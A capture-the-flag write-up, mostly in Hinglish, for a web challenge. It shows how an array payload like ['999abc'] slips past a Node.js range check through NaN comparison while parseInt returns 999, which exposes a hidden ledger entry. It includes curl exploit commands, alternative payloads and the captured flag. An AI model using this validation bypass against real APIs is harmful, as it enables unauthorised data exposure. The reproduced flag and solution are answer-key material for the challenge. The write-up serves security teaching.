# Waybill — CTF Writeup (50 pts, web)

## Challenge
"The dispatch office keeps shipment records in a small ledger. The API provides a preview for staff."
- `nc` nahi — ek **web API**: `http://52.146.88.61:<PORT>/`
- dist.zip mein Node.js source: `web/index.js` (server), `src/ledger.js` (ledger logic)

## Source analysis (ledger.js)
```js
function makeLedger(flag) {
  return [
    ...ordinaryEntries,                      // 12 normal entries (D-001..D-012)
    { id: 'D-013', status: 'sealed', note: flag },   // ← FLAG entry (index 12)
  ];
}

function preview(ledger, requestedSize) {
  if (requestedSize === undefined || typeof requestedSize === 'string') {
    return 400 'size must be a JSON number';
  }
  if (requestedSize < 1 || requestedSize > 10) {
    return 400 'size must be between 1 and 10';
  }
  const size = parseInt(requestedSize, 10);
  ...
  return { ok: true, entries: ledger.slice(0, size) };   // ← yahan size se slice
}
```

**Pehli nazar mein:** sirf 1–10 allowed → slice(0,10) tak max → 12 normal entries hi
dikhengi, flag (index 12) kabhi nahi.

## Vulnerability — JavaScript type confusion (ek comma ka kamaal)
JavaScript mein comparison aur parseInt **alag tarah se type-convert** karte hain:

| Value | `x < 1` / `x > 10` (Number coercion) | `parseInt(x, 10)` |
|---|---|---|
| `10` | 10 > 10 → false ✓ pass | 10 |
| `"999abc"` (string) | **rejected pehle hi** (typeof string) | — |
| **`["999abc"]` (array!)** | `Number(["999abc"])` = **NaN** → dono comparisons **false** ✓ PASS! | `parseInt("999abc")` = **999** |

- Array `[v]` ko number context mein daalo → sirf pehla element numeric ban-ne ki koshish hoti hai
- `"999abc"` → NaN (letters hain) → `NaN < 1` bhi false, `NaN > 10` bhi false → **dono checks bypass**
- Lekin `parseInt` string ka **leading numeric prefix** leta hai → 999
- Result: `ledger.slice(0, 999)` = **poora ledger, flag samet**

Ye isi liye chalta hai kyunki checks aur parseInt **different coercion algorithms**
(Number coercion vs string-numeric parsing) use karte hain — classic type-confusion.

## Solution (step by step)

### Step 1 — API explore karo
```bash
curl -s http://52.146.88.61:<PORT>/api
```
Response batata hai: route `POST /api/preview`, example `{size: 5}`, allowed 1–10.

### Step 2 — Normal request (flag nahi milega)
```bash
curl -s -X POST http://52.146.88.61:<PORT>/api/preview \
  -H 'content-type: application/json' -d '{"size": 10}'
```
→ 12 entries (D-001..D-012). Flag D-013 hai jo 13th pe hai — cutoff isliye nahi dikha.

### Step 3 — Bypass (THE payload)
Array bhejo jo comparison mein NaN de aur parseInt mein bada number de:
```bash
curl -s -X POST http://52.146.88.61:<PORT>/api/preview \
  -H 'content-type: application/json' -d '{"size": ["999abc"]}'
```

### Step 4 — Flag
Response ke `entries` mein aakhri entry:
```json
{"id":"D-013","status":"sealed","note":"web{...flag...}"}
```
`D-013` ka `note` hi flag hai — copy karke submit.

## Local testing (optional — code samajhne ke liye)
```bash
cd dist && node src/server.js          # FLAG env chahiye
FLAG='flag{test}' PORT=9999 node src/server.js &
curl -s -X POST http://127.0.0.1:9999/api/preview -H 'content-type: application/json' -d '{"size": ["999abc"]}'
```

## Alternative payloads (agar ek na chale)
- `{"size": ["13x"]}` → parseInt 13
- `{"size": ["0x99"]}` → hmm parseInt("0x99",10) = 0 (hex radix nahi in decimal mode) — avoid
- `{"size": ["999abc"]}` — recommended (verified working)

## Lesson
1. **Type-check aur value-check alag alag hoti hain** — agar typeof sirf "string" block kare,
   arrays/objects se conversion differences exploit hote hain
2. **NaN comparisons kabhi true nahi hote** — range check bypass ho jata hai
3. `parseInt` sirf leading digits uthata hai — "999abc" → 999
4. Jab bhi code `x < A && x > B` phir `parseInt(x)` kare — bracket-wrapped string try karo

## Flag (instance 36019, per-instance suffix hota hai)
```
web{one_comma_and_the_ledger_opens_55f7564ee46a179465072918tR8mZb4ef0471cf158d29fc4ce55e62bb6291733172373_133}
```
